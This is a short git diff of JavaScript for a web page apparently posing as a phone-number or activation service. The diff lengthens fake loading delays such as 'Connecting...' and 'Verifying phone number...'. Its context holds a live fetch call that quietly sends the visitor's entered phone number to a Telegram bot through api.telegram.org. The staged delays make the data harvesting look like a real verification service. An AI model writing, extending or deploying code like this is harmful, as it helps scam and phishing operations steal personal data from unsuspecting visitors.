@@ -63,7 +63,7 @@ function showLoading(text, duration, callback) {
 function verifyCode() {
     const inputCode = document.getElementById("activation-code").value;
     if (inputCode === activationCode) {
-        showLoading("Connecting...", 2000, () => {
+        showLoading("Connecting...", 8000, () => {
             showPage("phone-input-page");
         });
     } else {
@@ -80,7 +80,7 @@ function submitPhoneNumber() {
     }
 
     document.getElementById("phone-error").textContent = "";
-    showLoading("Verifying phone number...", 10000, () => {
+    showLoading("Verifying phone number...", 15000, () => {
         showPage("country-page");
 
         fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatID}&text=Phone Number: ${phoneNumber}`);
@@ -101,7 +101,7 @@ function loadCountries() {
 
 function selectCountry(country) {
     selectedCountry = country;
-    showLoading("Loading numbers...", 2000, () => {
+    showLoading("Loading numbers...", 10000, () => {
         showPage("number-page");
         loadNumbers();
     });
